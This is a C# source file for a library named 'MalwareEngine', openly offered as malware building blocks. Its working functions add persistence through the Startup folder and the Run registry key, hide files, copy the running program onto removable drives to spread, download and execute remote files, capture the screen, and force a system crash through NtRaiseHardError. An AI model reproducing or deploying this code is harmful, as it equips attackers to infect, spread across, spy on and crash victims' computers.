using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using IWshRuntimeLibrary;
using Microsoft.Win32;

namespace libmalwr_csharp
{
    public class MalwareEngine
    {
        [DllImport("ntdll.dll")]
        public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

        [DllImport("ntdll.dll")]
        public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

        public bool SetFileAttributesHidden(string FilePath)
        {
            try
            {
                System.IO.File.SetAttributes(FilePath, System.IO.File.GetAttributes(FilePath) | FileAttributes.Hidden);
                return true;
            }
            catch(Exception ex)
            {
                Console.WriteLine(ex.ToString());
                return false;
            }
        }

        public bool AddToStartupDirectory(string ShortcutName = null, string TargetExecutablePath = null, string Description = null, string ShortcutIconPath = null, bool HideShortcutFile = false)
        {
            try
            {
                if (String.IsNullOrEmpty(TargetExecutablePath))
                {
                    TargetExecutablePath = Application.ExecutablePath;
                }

                WshShell wsh = new WshShell();
                string startupFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                var appShortcut = (IWshRuntimeLibrary.IWshShortcut)wsh.CreateShortcut(startupFolderPath + "\\" + ShortcutName + ".lnk");

                appShortcut.WorkingDirectory = Application.StartupPath;
                appShortcut.TargetPath = Application.ExecutablePath;

                if (!String.IsNullOrEmpty(Description))
                {
                    appShortcut.Description = Description;
                }
                if (!String.IsNullOrEmpty(ShortcutIconPath))
                {
                    appShortcut.IconLocation = ShortcutIconPath;
                }
                if (String.IsNullOrEmpty(ShortcutName))
                {
                    ShortcutName = Path.GetFileNameWithoutExtension(Application.ExecutablePath.ToString());
                }

                appShortcut.Save();

                if (HideShortcutFile)
                {
                    SetFileAttributesHidden(startupFolderPath + "\\" + ShortcutName + ".lnk");
                }

                return true;
            }
            catch(Exception ex)
            {
                Console.WriteLine(ex.ToString());
                return false;
            }

        }
        
        public bool CopyToRemovableDevices(string TargetFileName = null, bool HideFile = false)
        {
            try
            {
                if (String.IsNullOrEmpty(TargetFileName))
                {
                    TargetFileName = Path.GetFileName(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName);
                }

                DriveInfo[] attachedDevices = DriveInfo.GetDrives();

                foreach (DriveInfo device in attachedDevices)
                {
                    if (device.DriveType == DriveType.Removable)
                    {
                        try
                        {
                            CopyToDirectory(device.Name, TargetFileName);
                            if (HideFile)
                            {
                                SetFileAttributesHidden(Path.Combine(device.Name, TargetFileName));
                            }
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(ex.ToString());
                        }
                    }
                }

                return true;
            }
            catch(Exception ex)
            {
                Console.WriteLine(ex.ToString());
                return false;
            }
        }

        public bool CreateStartupRegistryKey(string ApplicationName = null, string TargetExecutablePath = null)
        {
            try
            {
                RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                if (String.IsNullOrEmpty(TargetExecutablePath))
                {
                    TargetExecutablePath = Application.ExecutablePath;
                }
                if (String.IsNullOrEmpty(ApplicationName))
                {
                    ApplicationName = Path.GetFileNameWithoutExtension(Application.ExecutablePath);
                }
                key.SetValue(ApplicationName, TargetExecutablePath);
                return true;
            }
            catch(Exception ex)
            {
                Console.WriteLine(ex.ToString());
                return false;
            }
        }

        public bool Download(string Url, string UAString = null, string TargetDirectory = null, string TargetFileName = null, string TargetFileExtension = null)
        {
            try
            {
                using (WebClient webClient = new WebClient())
                {
                    if (!String.IsNullOrEmpty(UAString))
                    {
                        webClient.Headers.Add(UAString);
                    }
                    webClient.DownloadFile(Url, Path.Combine(TargetDirectory, TargetFileName + "." + TargetFileExtension));
                }
                return true;
            }
            catch(Exception ex)
            {
                Console.WriteLine(ex.ToString());
                return false;
            }
        }

        public bool Execute(string TargetExecutablePath)
        {
            try
            {
                Process.Start(TargetExecutablePath);
                return true;
            }
            catch(Exception ex)
            {
                Console.WriteLine(ex.ToString());
                return false;
            }
        }

        public bool DownloadAndExecute(string Url, string UAString = null, string TargetDirectory = null, string TargetFileName = null, string TargetFileExtension = null)
        {
            try
            {
                string TargetFilePath = Path.Combine(TargetDirectory, TargetFileName + "." + TargetFileExtension);
                using (WebClient webClient = new WebClient())
                {
                    if (!String.IsNullOrEmpty(UAString))
                    {
                        webClient.Headers.Add(UAString);
                    }
                    webClient.DownloadFile(Url, TargetFilePath);
                }
                Process.Start(TargetFilePath);
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
                return false;
            }
        }

        public void CaptureWebcam()
        {
            return;
        }

        public bool CaptureScreen(string TargetDirectory, string TargetFileName, ImageFormat FileType, PixelFormat ImagePixelFormat = PixelFormat.Format32bppArgb)
        {
            try
            {
                Bitmap screenBitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, ImagePixelFormat);
                Rectangle screenRectangle = Screen.AllScreens[0].Bounds;
                Graphics screenGraphics = Graphics.FromImage(screenBitmap);
                screenGraphics.CopyFromScreen(screenRectangle.Left, screenRectangle.Top, 0, 0, screenRectangle.Size);

                string FileTypeExtension = String.Empty;

                if(FileType == ImageFormat.Bmp)
                {
                    FileTypeExtension = ".bmp";
                }
                else if(FileType == ImageFormat.Jpeg)
                {
                    FileTypeExtension = ".jpeg";
                }
                else if (FileType == ImageFormat.Png)
                {
                    FileTypeExtension = ".png";
                }

                screenBitmap.Save(Path.Combine(TargetDirectory, TargetFileName + FileTypeExtension), FileType);
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
                return false;
            }
        }

        public bool CopyToDirectory(string TargetDirectory, string TargetFileName = null)
        {
            try
            {
                string processExecutablePath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
                if (String.IsNullOrEmpty(TargetFileName))
                {
                    TargetFileName = System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName;
                }
                string destinationExecutablePath = Path.Combine(TargetDirectory, TargetFileName);
                System.IO.File.Copy(processExecutablePath, destinationExecutablePath);
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
                return false;
            }
        }

        public void ForceBSOD()
        {
            int Zero = 0;
            IntPtr ZeroPtr = (IntPtr)Zero;
            RtlAdjustPrivilege(19, true, false, out bool tempBool);
            NtRaiseHardError(0xC0000420, 0, 0, ZeroPtr, 6, out uint tempInt);
            return;
        }
    }
}
